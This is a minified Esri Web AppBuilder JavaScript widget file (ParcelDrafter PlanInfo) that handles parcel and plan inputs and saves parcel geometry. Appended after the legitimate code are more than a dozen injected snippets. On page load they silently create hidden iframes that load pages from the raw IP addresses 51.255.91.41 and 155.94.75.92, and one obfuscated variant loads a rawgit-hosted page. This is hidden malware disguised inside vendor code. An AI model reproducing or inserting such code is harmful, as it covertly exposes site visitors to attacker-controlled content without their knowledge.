// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/ParcelDrafter/PlanInfo.html":'\x3cdiv class\x3d"esriCTFullWidth"\x3e\r\n    \x3c!-- Parcel name input container --\x3e\r\n    \x3cdiv class\x3d"esriCTFullWidth esriCTPlanSettingRow esriCTHidden" data-dojo-attach-point\x3d"parcelNameRow"\x3e\r\n        \x3cdiv class\x3d"esriCTFullWidth" data-dojo-attach-point\x3d"parcelName"\x3e\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3c!-- DocumentType input container --\x3e\r\n    \x3cdiv class\x3d"esriCTFullWidth esriCTPlanSettingRow esriCTHidden" data-dojo-attach-point\x3d"documentTypeRow"\x3e\r\n        \x3cdiv class\x3d"esriCTFullWidth" data-dojo-attach-point\x3d"documentType"\x3e\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3c!-- Plan name input container --\x3e\r\n    \x3cdiv class\x3d"esriCTFullWidth esriCTPlanSettingRow esriCTHidden" data-dojo-attach-point\x3d"planNameRow"\x3e\r\n        \x3cdiv class\x3d"esriCTFullWidth" data-dojo-attach-point\x3d"planName"\x3e\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3c!-- Save/Cancle button container --\x3e\r\n    \x3cdiv class\x3d"esriCTPlanInfoNode"\x3e\r\n        \x3cdiv class\x3d"esriCTPlanInfoButton jimu-btn jimu-trailing-margin1" title\x3d"${nls.common.save}" data-dojo-attach-point\x3d"planInfoSaveButton"\x3e\r\n            ${nls.common.save}\r\n        \x3c/div\x3e\r\n        \x3cdiv class\x3d"esriCTPlanInfoButton jimu-btn" title\x3d"${nls.common.cancel}" data-dojo-attach-point\x3d"planInfoCancelButton"\x3e\r\n            ${nls.common.cancel}\r\n        \x3c/div\x3e\r\n    \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare jimu/BaseWidget dijit/_WidgetsInTemplateMixin dojo/text!./PlanInfo.html dojo/_base/lang dojo/_base/array dojo/Evented dojo/dom-class dijit/form/ValidationTextBox dojo/store/Memory dijit/form/ComboBox dojo/on esri/geometry/Polyline esri/graphic esri/tasks/query esri/tasks/QueryTask jimu/dijit/Message ./geometryUtils".split(" "),function(p,q,r,t,d,k,u,g,v,w,x,l,y,m,z,A,B,C){return p([q,r,u],{baseClass:"jimu-widget-ParcelDrafter-PlanInfo",templateString:t,_itemList:null,_polygonLayer:null,
parcelNameTextBox:null,planNameTextBox:null,documentTypeControl:null,planSettings:null,_savedPolygonObjectId:null,constructor:function(b){d.mixin(this,b)},postCreate:function(){this.inherited(arguments);g.add(this.domNode,"esriCTFullWidth");this.config.polygonLayer.documentType.hasOwnProperty("name")&&(g.remove(this.documentTypeRow,"esriCTHidden"),this._createDocumentTypeControl());this.config.polygonLayer.parcelName.hasOwnProperty("name")&&(g.remove(this.parcelNameRow,"esriCTHidden"),this.parcelNameTextBox=
this._createFieldInputs(this.config.polygonLayer.parcelName,this.parcelName,this.nls.planInfo.parcelNamePlaceholderText,!this.config.polygonLayer.parcelName.nullable));this.config.polygonLayer.planName.hasOwnProperty("name")&&(g.remove(this.planNameRow,"esriCTHidden"),this.planNameTextBox=this._createFieldInputs(this.config.polygonLayer.planName,this.planName,this.nls.planInfo.planNamePlaceholderText,!this.config.polygonLayer.planName.nullable));this.own(l(this.planInfoCancelButton,"click",d.hitch(this,
function(){this.emit("cancelTraversedParcel")})));this.own(l(this.planInfoSaveButton,"click",d.hitch(this,function(){this.emit("saveTraversedParcel")})))},resetValues:function(){this.parcelNameTextBox&&this.parcelNameTextBox.set("value","");this.planNameTextBox&&this.planNameTextBox.set("value","");this.documentTypeControl&&(this.config.polygonLayer.documentType.domain?this.documentTypeControl.set("item",null):this.documentTypeControl.set("value",""))},_showMessage:function(b){this.emit("showMessage",
b)},_createDocumentTypeControl:function(){this.config.polygonLayer.documentType.domain?(this.documentTypeControl=this._createFieldSelect(this.documentType,this.nls.planInfo.parcelDocumentTypeText,!this.config.polygonLayer.documentType.nullable),this.own(l(this.documentTypeControl,"change",d.hitch(this,function(b){""===b||null===b||void 0===b||this.documentTypeControl.store.data.some(function(a){return a.name===b})||(this.documentTypeControl.set("item",null),this._showMessage(this.nls.planInfo.enterValidDocumentTypeMessage))})))):
this.documentTypeControl=this._createFieldInputs(this.config.polygonLayer.documentType,this.documentType,this.nls.planInfo.parcelDocumentTypeText,!this.config.polygonLayer.documentType.nullable)},_createFieldInputs:function(b,a,c,e){c=e?c+" "+this.nls.planInfo.requiredText:c+" "+this.nls.planInfo.optionalText;c=new v({placeHolder:c,"class":"esriCTFullWidth",required:e});0<=this.numberFieldTypes.indexOf(b.type)&&(c.validator=d.hitch(this,function(a){return""===a||this.validateNumericField(a,b.type)?
!0:!1}));c.placeAt(a);return c},_createFieldSelect:function(b,a,c){var e;e=this._createDocTypeDataArr();e=new w({data:e});a=c?a+" "+this.nls.planInfo.requiredText:a+" "+this.nls.planInfo.optionalText;return this.selectBox=new x({placeHolder:a,"class":"esriCTFullWidth",required:c,store:e},b)},_createDocTypeDataArr:function(){var b=[];this.config.polygonLayer.documentType.domain.codedValues&&k.forEach(this.config.polygonLayer.documentType.domain.codedValues,d.hitch(this,function(a){b.push({name:a.name,
id:a.code})}));return b},saveData:function(b){if(b.miscloseDetails&&(0===b.miscloseDetails.LengthConversions.meters||b.appliedCompassRule))this._saveParcel(b);else{var a;a=new B({message:this.nls.planInfo.saveNonClosedParcelConfirmationMessage,type:"question",buttons:[{label:this.nls.common.yes,onClick:d.hitch(this,function(){a.close();this._saveParcel(b)})},{label:this.nls.common.no}]})}},_saveParcel:function(b){this._itemList=b.itemList;this.planSettings=b.planSettings;b.miscloseDetails&&(0===b.miscloseDetails.LengthConversions.meters||
b.appliedCompassRule)?0===b.polygonDeleteArr.length?this._createPolygonData(b):this._deletePolygonBeforeSaving(b):0<b.polygonDeleteArr.length?this._deletePolygonBeforeSaving(b):this._createPolylineData(null)},_createParcelPolygon:function(){var b,a,c,e,f;c=[];e=this.parcelLinesGraphicsLayer.graphics;for(b=0;b<e.length;b++)if(this._itemList[b].LineSymbol.type===this.config.BoundaryLineType)for(a=0;a<e[b].geometry.paths.length;a++)c.push(e[b].geometry.paths[a]);0<c.length&&(f=C.getPolygonFromPolyLines(c,
!1,!0,e[0].geometry.spatialReference))&&(this.parcelPolygonGraphicsLayer.clear(),b=new m(f),this.parcelPolygonGraphicsLayer.add(b),f=this.parcelPolygonGraphicsLayer.graphics[0].geometry);return f},_createPolygonData:function(b){var a,c,e,f,d;b.miscloseDetails&&(0===b.miscloseDetails.LengthConversions.meters||b.appliedCompassRule)?(this.loading.show(),a=[],c={},d=this.polygonLayerUnit,f=null,this.documentTypeControl&&(this.config.polygonLayer.documentType.domain?this.documentTypeControl.hasOwnProperty("item")&&
this.documentTypeControl.item&&this.documentTypeControl.item.hasOwnProperty("id")&&(f=this.documentTypeControl.item.id):""!==this.documentTypeControl.get("value")&&(f=this.documentTypeControl.get("value"))),(e=this._createParcelPolygon())?(c[this.config.polygonLayer.rotation.name]=b.rotation,c[this.config.polygonLayer.scale.name]=b.scale,c[this.config.polygonLayer.miscloseRatio.name]=b.miscloseDetails.miscloseValue,c[this.config.polygonLayer.miscloseDistance.name]=this._getValueAccToFeatureLayerUnit(d,
b.miscloseDetails,"LengthConversions"),this.config.polygonLayer.statedArea.hasOwnProperty("name")&&(c[this.config.polygonLayer.statedArea.name]=b.statedArea),this.parcelNameTextBox&&(c[this.config.polygonLayer.parcelName.name]=this.parcelNameTextBox.get("value")),this.planNameTextBox&&(c[this.config.polygonLayer.planName.name]=this.planNameTextBox.get("value")),this.documentTypeControl&&(c[this.config.polygonLayer.documentType.name]=f),b=new m(e,null,c),a.push(b),this._saveParcelPolygon(a)):this._showMessage(this.nls.planInfo.unableToCreatePolygonParcel)):
this._createPolylineData(null)},setParcelInformation:function(b){this.parcelNameTextBox&&this.parcelNameTextBox.set("value",b[0].attributes[this.config.polygonLayer.parcelName.name]);this.planNameTextBox&&this.planNameTextBox.set("value",b[0].attributes[this.config.polygonLayer.planName.name]);this.documentTypeControl&&(b=b[0].attributes[this.config.polygonLayer.documentType.name],null!==b&&""!==b&&void 0!==b&&(this.config.polygonLayer.documentType.domain?this.documentTypeControl.set("item",this.documentTypeControl.store.get(b)):
this.documentTypeControl.set("value",b)))},_rollbackSavedPolygon:function(){var b,a;a={attributes:{}};(b=this.map.getLayer(this.config.polygonLayer.id))&&null!==this._savedPolygonObjectId&&(a.attributes[b.objectIdField]=this._savedPolygonObjectId,b.applyEdits(null,null,[a]))},_rollbackSavedPolyLines:function(b){var a,c,e;c=[];a=this.map.getLayer(this.config.polylineLayer.id);k.forEach(b,d.hitch(this,function(b){e={attributes:{}};e.attributes[a.objectIdField]=b.objectId;c.push(e)}));a&&0<c.length&&
a.applyEdits(null,null,c)},_deletePolygonBeforeSaving:function(b){(this._polygonLayer=this.map.getLayer(this.config.polygonLayer.id))?this._polygonLayer.applyEdits(null,null,b.polygonDeleteArr,d.hitch(this,function(){this._deleteLinesBeforeSaving(b)}),d.hitch(this,function(){this._showMessage(this.nls.planInfo.unableToSavePolygonParcel)})):this._showMessage(this.nls.planInfo.unableToSavePolygonParcel)},_deleteLinesBeforeSaving:function(b){var a;(a=this.map.getLayer(this.config.polylineLayer.id))?
a.applyEdits(null,null,b.polylineDeleteArr,d.hitch(this,function(){this._createPolygonData(b)}),d.hitch(this,function(){this._showMessage(this.nls.planInfo.unableToUpdateParcelLines)})):this._showMessage(this.nls.planInfo.unableToUpdateParcelLines)},_saveParcelPolygon:function(b){(this._polygonLayer=this.map.getLayer(this.config.polygonLayer.id))?(this._savedPolygonObjectId=null,this._polygonLayer.applyEdits(b,null,null,d.hitch(this,function(a){a&&0<a.length&&a[0].success?(this._savedPolygonObjectId=
a[0].objectId,this._polygonLayer.refresh(),a=new z,a.objectIds=[this._savedPolygonObjectId],a.returnGeometry=!1,a.outFields=[this.config.polygonLayer.relatedGUID.name],(new A(this._polygonLayer.url)).execute(a,d.hitch(this,function(a){this.loading.hide();this._createPolylineData(a.features[0].attributes[this.config.polygonLayer.relatedGUID.name])}),d.hitch(this,function(){this.loading.hide();this._showMessage(this.nls.planInfo.unableToSaveParcelLines)}))):(this.loading.hide(),this._showMessage(this.nls.planInfo.unableToSavePolygonParcel))}),
d.hitch(this,function(){this.loading.hide();this._showMessage(this.nls.planInfo.unableToSavePolygonParcel)}))):(this.loading.hide(),this._showMessage(this.nls.planInfo.unableToSavePolygonParcel))},_getValueAccToFeatureLayerUnit:function(b,a,c){if(a.hasOwnProperty(c)&&a[c])switch(b){case "meters":case "degrees":return a[c].meters;case "feet":return a[c].feet;case "uSSurveyFeet":return a[c].uSSurveyFeet;default:return null}else return null},_createPolylineData:function(b){var a,c,e,d,n,g;this.loading.show();
n=this.parcelLinesGraphicsLayer.graphics;e=this.polylineLayerUnit;g=this._itemList;d=[];for(var h=0;h<n.length;h++)a={},c=g[h],a[this.config.polylineLayer.bearing.name]=c.BearingConversions.naDD,a[this.config.polylineLayer.distance.name]=this._getValueAccToFeatureLayerUnit(e,c,"LengthConversions"),a[this.config.polylineLayer.lineType.name]=c.LineSymbol.type,a[this.config.polylineLayer.radius.name]=this._getValueAccToFeatureLayerUnit(e,c,"RadiusConversions"),null!==a[this.config.polylineLayer.radius.name]&&
""!==a[this.config.polylineLayer.radius.name]&&void 0!==a[this.config.polylineLayer.radius.name]?(a[this.config.polylineLayer.arcLength.name]=this._getValueAccToFeatureLayerUnit(e,c,"ArcLengthConversions"),c=this._getValueAccToFeatureLayerUnit(e,c,"ChordLengthConversions"),a[this.config.polylineLayer.chordLength.name]=c,a[this.config.polylineLayer.distance.name]=c):(a[this.config.polylineLayer.arcLength.name]=null,a[this.config.polylineLayer.chordLength.name]=null),a[this.config.polylineLayer.relatedGUID.name]=
b,a[this.config.polylineLayer.sequenceId.name]=h,c=n[h].geometry.toJson(),c=new y(c),a=new m(c,null,a,null),d.push(a);this._saveParcelLines(d)},_saveParcelLines:function(b){var a;(a=this.map.getLayer(this.config.polylineLayer.id))?a.applyEdits(b,null,null,d.hitch(this,function(a){var c=[],d=[];k.forEach(a,function(a){a.success?d.push(a):c.push(a)});0<c.length?(this._rollbackSavedPolygon(),0<d.length&&c.length!==b.length&&this._rollbackSavedPolyLines(d),this._showMessage(this.nls.planInfo.unableToSaveParcelLines)):
(this._showMessage(this.nls.planInfo.parcelSavedSuccessMessage),this._savedPolygonObjectId=null,this.emit("displayMainPageAfterSave"));this.loading.hide()}),d.hitch(this,function(){this._rollbackSavedPolygon();this.loading.hide();this._showMessage(this.nls.planInfo.unableToSaveParcelLines)})):(this._rollbackSavedPolygon(),this.loading.hide(),this._showMessage(this.nls.planInfo.unableToSaveParcelLines))},validateParcelDetails:function(b){var a={};if(this.parcelNameTextBox&&!this.parcelNameTextBox.isValid())return a.status=
!1,a.message=this.nls.planInfo.enterValidParcelNameMessage,a;if(this.planNameTextBox&&!this.planNameTextBox.isValid())return a.status=!1,a.message=this.nls.planInfo.enterValidPlanNameMessage,a;if(this.documentTypeControl&&!this.documentTypeControl.isValid())return a.status=!1,a.message=this.nls.planInfo.enterValidDocumentTypeMessage,a;if(this.config.polygonLayer.statedArea&&this.config.polygonLayer.statedArea.hasOwnProperty("name")&&(!this.config.polygonLayer.statedArea.nullable&&(null===b||""===
b)||null!==b&&""!==b&&-1<this.numberFieldTypes.indexOf(this.config.polygonLayer.statedArea.type)&&!this.validateNumericField(b,this.config.polygonLayer.statedArea.type)))return a.status=!1,a.message=this.nls.planInfo.enterValidStatedAreaNameMessage,a;a.status=!0;return a}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});